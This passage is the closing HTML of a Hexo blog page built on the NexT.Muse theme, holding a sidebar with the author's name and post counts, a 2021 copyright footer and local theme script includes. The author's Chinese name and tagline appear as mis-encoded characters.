      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">å…­å…¬å­ä¹°å•</p>
  <div class="site-description" itemprop="description">ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">å…­å…¬å­ä¹°å•</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
